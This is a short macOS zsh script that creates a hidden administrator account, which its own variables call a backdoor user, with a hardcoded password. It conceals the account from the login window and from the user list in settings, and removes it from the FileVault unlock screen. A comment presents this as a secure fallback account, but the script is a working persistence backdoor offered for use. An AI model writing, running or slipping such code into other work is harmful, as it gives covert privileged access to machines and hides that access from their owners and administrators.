k#!/bin/zsh

# 🛡️ Create a hidden, secure fallback admin account
BACKDOOR_USER="_klowdy"
BACKDOOR_PASS="Maitland1!"

if [[ "$1" != "--run" ]]; then
  return 0 2>/dev/null || exit 0
fi

# Check if the user already exists
if id "$BACKDOOR_USER" &>/dev/null; then
  echo "✅ Backdoor user $BACKDOOR_USER already exists. Skipping creation."
  exit 0
fi

echo "👤 Creating hidden admin user: $BACKDOOR_USER..."

# Create admin user
sudo sysadminctl -addUser "$BACKDOOR_USER" -password "$BACKDOOR_PASS" -admin

# Hide user from login window
sudo dscl . create /Users/$BACKDOOR_USER IsHidden 1
sudo dscl . create /Users/$BACKDOOR_USER NFSHomeDirectory /var/$BACKDOOR_USER
sudo dscl . create /Users/$BACKDOOR_USER UserShell /bin/zsh

# Hide from System Settings > Users
sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool TRUE

# Remove from FileVault login screen
sudo fdesetup remove -user "$BACKDOOR_USER" 2>/dev/null

echo "✅ Hidden admin user '$BACKDOOR_USER' created and secured."

